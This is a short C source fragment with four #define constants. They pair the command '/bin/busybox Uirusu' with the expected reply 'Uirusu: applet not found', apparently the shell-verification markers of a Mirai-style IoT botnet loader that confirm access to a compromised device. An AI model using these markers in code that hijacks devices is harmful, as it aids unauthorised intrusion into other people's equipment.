...
#define TOKEN_QUERY     "/bin/busybox Uirusu"
#define TOKEN_RESPONSE  "Uirusu: applet not found"

#define EXEC_QUERY     "/bin/busybox Uirusu"
#define EXEC_RESPONSE  "Uirusu: applet not found"
